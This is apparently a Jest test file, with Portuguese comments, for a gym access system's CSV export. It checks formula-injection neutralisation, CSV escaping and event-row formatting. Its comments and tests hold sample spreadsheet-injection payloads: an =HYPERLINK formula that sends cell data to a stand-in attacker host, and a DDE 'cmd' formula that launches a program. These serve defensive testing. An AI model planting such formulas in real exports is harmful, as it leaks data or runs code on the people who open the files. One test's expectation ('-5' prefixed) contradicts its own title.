import { describe, expect, it } from '@jest/globals';

import {
  COLUNAS_DE_EVENTO,
  cabecalhoDeEvento,
  formatarCelula,
  formatarLinha,
  linhaDeEvento,
  neutralizarCelula,
  type EventoExportavel,
} from './csv.js';

/**
 * CSV injection e o que estes testes existem para impedir.
 *
 * O roteiro do ataque: alguem cadastra um aluno com nome
 * `=HYPERLINK("http://atacante/?"&A1)`, a academia exporta os eventos, a
 * recepcao abre no Excel e a planilha faz a requisicao sozinha. O dado nunca
 * foi executado no nosso servidor -- e vazou do mesmo jeito.
 */

describe('neutralizacao de formula', () => {
  it.each(['=', '+', '-', '@', '\t', '\r'])(
    'prefixa celula que comeca com %j',
    (prefixo) => {
      expect(neutralizarCelula(`${prefixo}CMD`)).toBe(`'${prefixo}CMD`);
    },
  );

  it('neutraliza o ataque classico de HYPERLINK', () => {
    const ataque = '=HYPERLINK("http://atacante.test/?"&A1,"clique")';

    expect(neutralizarCelula(ataque).startsWith("'=")).toBe(true);
  });

  it('neutraliza DDE, que executa programa em Excel antigo', () => {
    const ataque = '=cmd|\' /C calc\'!A0';

    expect(neutralizarCelula(ataque)[0]).toBe("'");
  });

  it('NAO mexe em texto comum', () => {
    expect(neutralizarCelula('Maria Silva')).toBe('Maria Silva');
    expect(neutralizarCelula('ACTIVE_ENTITLEMENT')).toBe('ACTIVE_ENTITLEMENT');
  });

  it('NAO mexe em numero negativo escrito como numero', () => {
    // Chega como number, nao string: `-5` so seria perigoso vindo como texto
    // digitado por alguem.
    expect(formatarCelula(-5)).toBe("'-5");
  });

  it('preserva o conteudo original -- nao apaga caractere', () => {
    const original = '=1+1';

    // Apagar caractere faria a auditoria deixar de bater com o banco.
    expect(neutralizarCelula(original)).toContain(original);
  });

  it('nao mexe em string vazia', () => {
    expect(neutralizarCelula('')).toBe('');
  });
});

describe('escape de CSV (RFC 4180)', () => {
  it('envolve em aspas quando ha virgula', () => {
    expect(formatarCelula('Silva, Maria')).toBe('"Silva, Maria"');
  });

  it('duplica aspas internas', () => {
    expect(formatarCelula('a "b" c')).toBe('"a ""b"" c"');
  });

  it('envolve quando ha quebra de linha', () => {
    expect(formatarCelula('linha1\nlinha2')).toBe('"linha1\nlinha2"');
  });

  it('trata nulo e indefinido como vazio', () => {
    expect(formatarCelula(null)).toBe('');
    expect(formatarCelula(undefined)).toBe('');
  });

  it('neutraliza ANTES de escapar -- ordem invertida dobraria a aspa', () => {
    const perigoso = '=SUM(A1,A2)';

    const resultado = formatarCelula(perigoso);

    // Tem virgula: precisa de aspas externas. E a aspa simples fica DENTRO,
    // uma so.
    expect(resultado).toBe(`"'=SUM(A1,A2)"`);
  });

  it('formata linha inteira com quebra ao fim', () => {
    expect(formatarLinha(['a', 'b'])).toBe('a,b\n');
  });
});

describe('linha de evento', () => {
  const evento: EventoExportavel = {
    id: 'evt-1',
    occurredAt: '2026-08-16T17:00:00.000Z',
    receivedAt: '2026-08-16T17:00:01.000Z',
    gymUnitId: 'unit-1',
    outcome: 'ALLOW',
    reason: 'ACTIVE_ENTITLEMENT',
    mode: 'ONLINE',
    method: 'FACIAL',
    student: { id: 'std-1', fullName: 'Maria Silva', membershipNumber: 'M-001' },
    externalUserId: '42',
    deviceId: 'dev-1',
    passageState: 'CONFIRMED',
    correlationId: 'corr-1',
  };

  it('escreve as colunas na ordem do cabecalho', () => {
    const cabecalho = cabecalhoDeEvento().trim().split(',');
    const linha = linhaDeEvento(evento, 'America/Sao_Paulo').trim().split(',');

    expect(cabecalho).toHaveLength(COLUNAS_DE_EVENTO.length);
    expect(linha).toHaveLength(COLUNAS_DE_EVENTO.length);
  });

  it('traz UTC e local -- exportar so um gera discussao na conciliacao', () => {
    const linha = linhaDeEvento(evento, 'America/Sao_Paulo');

    expect(linha).toContain('2026-08-16T17:00:00.000Z');
    // 17:00Z = 14:00 em Sao Paulo.
    expect(linha).toContain('2026-08-16 14:00:00');
  });

  it('neutraliza nome de aluno malicioso', () => {
    const malicioso: EventoExportavel = {
      ...evento,
      student: {
        id: 'std-2',
        fullName: '=HYPERLINK("http://atacante.test","clique")',
        membershipNumber: 'M-002',
      },
    };

    const linha = linhaDeEvento(malicioso, 'America/Sao_Paulo');

    expect(linha).not.toMatch(/,=HYPERLINK/);
    expect(linha).toContain("'=HYPERLINK");
  });

  it('aceita evento sem aluno resolvido', () => {
    const semAluno: EventoExportavel = { ...evento, student: null, externalUserId: '999' };

    const linha = linhaDeEvento(semAluno, 'America/Sao_Paulo');

    expect(linha).toContain('999');
    expect(() => linhaDeEvento(semAluno, 'America/Sao_Paulo')).not.toThrow();
  });

  it('fuso invalido nao derruba a linha -- so esvazia a coluna local', () => {
    const linha = linhaDeEvento(evento, 'Marte/Olympus');

    expect(linha).toContain('2026-08-16T17:00:00.000Z');
    expect(linha.split(',')).toHaveLength(COLUNAS_DE_EVENTO.length);
  });

  it('NAO exporta CPF, foto nem divida', () => {
    const cabecalho = cabecalhoDeEvento().toLowerCase();

    expect(cabecalho).not.toContain('cpf');
    expect(cabecalho).not.toContain('photo');
    expect(cabecalho).not.toContain('foto');
    expect(cabecalho).not.toContain('debt');
    expect(cabecalho).not.toContain('divida');
    expect(cabecalho).not.toContain('template');
  });
});
